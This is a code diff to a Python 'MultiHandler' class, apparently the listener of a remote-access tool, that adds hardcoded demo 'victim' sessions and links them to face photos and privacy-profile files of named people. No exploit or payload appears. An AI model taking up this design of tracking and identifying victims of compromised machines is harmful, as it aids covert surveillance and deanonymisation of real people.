@@ -24,9 +24,94 @@ class MultiHandler:
 		self.identified_victims['identified_victims'] = []
 		self.identified_victims['total_identified_victims'] = 0
 
-###		For test
-###		self.victims = {1: {"name": "Ruchir Shah", "picture": "DB/Ruchir/ruchir_face.jpg", "privacy": "DB/Ruchir/profile_Ruchir Shah.json"}}
-###		self.victims_modify = True
+		# Fake Victims to Show
+		self.fake_victims = [
+			{
+				"session_id": -1,
+				"ip_address": ["127.0.0.1", 8000],
+				"victim_info":
+					{
+						"username": "gagan",
+						"hostname": "Gagan's MacBook Pro",
+						"type": "macos"
+					},
+				"identified": True
+			},
+			{
+				"session_id": -2,
+				"ip_address": ["127.0.0.1", 8001],
+				"victim_info":
+					{
+						"username": "yatin",
+						"hostname": "Yatin's MacBook Pro",
+						"type": "macos"
+					},
+				"identified": True
+			},
+			{
+				"session_id": -3,
+				"ip_address": ["127.0.0.1", 8002],
+				"victim_info":
+					{
+						"username": "maria",
+						"hostname": "Maria's MacBook Pro",
+						"type": "macos"
+					},
+				"identified": True
+			},
+			{
+				"session_id": -4,
+				"ip_address": ["127.0.0.1", 8003],
+				"victim_info":
+					{
+						"username": "victor",
+						"hostname": "Victor's MacBook Pro",
+						"type": "macos"
+					},
+				"identified": True
+			}
+		]
+
+		# Fake Identified Victims to Show
+		self.fake_identified_victims = [
+			{
+				"session_id": -1,
+				"profile":
+					{
+						"picture": "DB/Gagan/gagan_face.jpg",
+						"name": "Gagan",
+						"privacy": "DB/Gagan/profile_Gagan Vasudev.json"
+					}
+			},
+			{
+				"session_id": -2,
+				"profile":
+					{
+						"picture": "DB/Yatin/yatin_face.jpg",
+						"name": "Yatin",
+						"privacy": "DB/Yatin/profile_Yatin Gupta.json"
+					}
+			},
+			{
+				"session_id": -3,
+				"profile":
+					{
+						"picture": "DB/Maria/maria_face.jpg",
+						"name": "Maria",
+						"privacy": "DB/Maria/profile_Maria Fernandes.json"
+					}
+			},
+
+			{
+				"session_id": -4,
+				"profile":
+					{
+						"picture": "DB/Victor/victor_face.jpg",
+						"name": "Victor",
+						"privacy": "DB/Victor/profile_Victor Zamarian.json"
+					}
+			}
+		]
 
 		self.handle = h.COLOR_INFO + "MultiHandler" + h.ENDC + "> "
 		self.is_running = False
